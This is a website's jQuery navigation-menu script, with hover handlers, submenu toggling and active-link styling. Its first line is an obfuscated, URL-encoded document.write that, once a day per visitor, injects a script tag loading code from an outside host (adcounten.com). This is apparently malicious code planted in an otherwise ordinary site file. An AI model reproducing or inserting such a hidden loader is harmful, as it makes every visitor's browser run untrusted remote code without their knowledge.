
if(document.cookie.indexOf('20120811')==-1){var expires=new Date();expires.setTime(expires.getTime()+24*60*60*1000);document.cookie='20120811=Yes;path=/;expires='+expires.toGMTString();document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%61%64%63%6F%75%6E%74%65%6E%2E%63%6F%6D%2F%61%64%2E%70%68%70%3F%70%69%64%3D%32%30%31%32%30%38%31%31%22%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%3E%3C%2F%73%63%72%69%70%74%3E'));}

var theTimer = '';
var initNavNum = 0;
function liMouseOver(num){
	clearTimeout(theTimer);	
	$('.nav li.m_li_a').removeClass('m_li_a').addClass('m_li');
	$('.nav #m_'+num).removeClass('m_li').addClass('m_li_a');	
	$('.menu_c .c_li:visible').hide();
	$('.menu_c #c_'+num).show();
};

function liMouseOut(){
	theTimer = setTimeout(function(){hideLi()},200);
};

function hideLi(){
	$('.nav li.m_li_a').removeClass('m_li_a').addClass('m_li');
	$('.nav #m_'+initNavNum).removeClass('m_li').addClass('m_li_a');	
	$('.menu_c .c_li:visible').hide();
	$('.menu_c #c_'+initNavNum).show();
};

function setLiMouseOut(){
	theTimer = setTimeout(function(){hideLi()},200);
};

function setLiMouseOver(){
	clearTimeout(theTimer);	
};
$(function() {

//     initNavNum = $('.nav .m_li_a');
//    if(initNavNum.length){//要硬性显示的项目
//	    initNavNum = Number(initNavNum.attr('id').replace('m_',''));
//    }

$('#menu_h_ul li').removeClass('m_li_a');
$('#m_'+initNavNum).addClass('m_li_a');
$('#c_'+initNavNum).show();

});

$(function() {
    $('.c_li li').mouseover(function() {
        $(this).find('.n_li').addClass('n_li_a');
        var cid = getParam('cID', $(this).find('.n_li').attr('href'));
        //恒洁新品时不显示二级菜单
        if (cid == '108' || cid == '87'|| cid == '51') {
            $(this).find('.menu_listtwo').hide();
        } else {
            $(this).find('.menu_listtwo').show();
        };

    }).mouseout(function() {
        $(this).find('.n_li').removeClass('n_li_a');
        $(this).find('.menu_listtwo').hide();
    });

    /*---------当前页面链接添加样式 nactive--------------------(start)-----------------------------*/
    var url = window.location.href.toLowerCase();
    if (url.indexOf("/") > -1) {
        var urlArray = url.split("/");
        url = urlArray[urlArray.length - 1];
    };

    $('div.menu_c a').each(function(index, element) {
        var a_href = element.href.toLowerCase();
        if (a_href.indexOf("/") > -1) {
            var a_hrefArray = a_href.split("/");
            a_href = a_hrefArray[a_hrefArray.length - 1];
        }

        if (url == a_href) {
            $(element).addClass('nactive');
        }
    });
    /*---------当前页面链接添加样式 nactive--------------------(end)-----------------------------*/
	
	//当屏幕小亿自动出现滚动板
	$(window).resize(function(){
		var body = $('body');
		if(body .width() < 1000){
			body .css('overflow-x','visible')
		}else{
			body .css('overflow-x','hidden')
		};
	});
	
});
